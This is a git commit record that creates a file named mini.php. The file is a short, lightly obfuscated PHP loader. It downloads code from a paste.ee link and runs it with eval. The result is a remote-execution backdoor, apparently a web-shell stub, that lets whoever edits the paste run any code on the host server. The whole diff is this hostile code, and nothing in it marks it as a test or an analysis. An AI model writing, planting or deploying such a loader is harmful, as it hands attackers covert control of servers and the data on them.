2cca98b2a05e1e34806342257914e95b5a209a07
xinz769 <a90870619@gmail.com>
2025-05-30 13:13:44 +0700

    Create mini.php

---
+++ 769/mini.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://paste.ee/r/6oYFKDzo/0"
+            )
+        )
+); ?>
